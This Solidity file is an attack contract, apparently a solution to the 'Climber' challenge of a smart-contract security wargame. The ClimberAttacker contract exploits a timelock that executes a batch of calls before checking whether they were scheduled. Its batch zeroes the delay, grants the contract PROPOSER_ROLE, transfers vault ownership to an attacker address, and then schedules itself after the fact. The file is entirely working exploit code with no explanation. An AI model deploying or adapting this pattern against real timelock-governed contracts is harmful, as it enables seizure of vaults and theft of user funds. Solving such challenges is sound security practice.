// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../climber/ClimberVault.sol";

interface IClimberTimelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract ClimberAttacker {
    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;
    bytes32 private salt;
    IClimberTimelock private timelock;
    address private vault;
    address private attacker;

    constructor(
        address _timelock,
        address _vault,
        address _attacker
    ) {
        timelock = IClimberTimelock(_timelock);
        vault = _vault;
        attacker = _attacker;
    }

    function attack() external {
        targets.push(address(timelock));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));

        targets.push(address(timelock));
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
        );

        targets.push(address(vault));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("transferOwnership(address)", attacker));

        dataElements.push(abi.encodeWithSignature("schedule()"));
        values.push(0);
        targets.push(address(this));

        salt = keccak256("SALT");

        timelock.execute(targets, values, dataElements, salt);
    }

    function schedule() public {
        timelock.schedule(targets, values, dataElements, salt);
    }
}
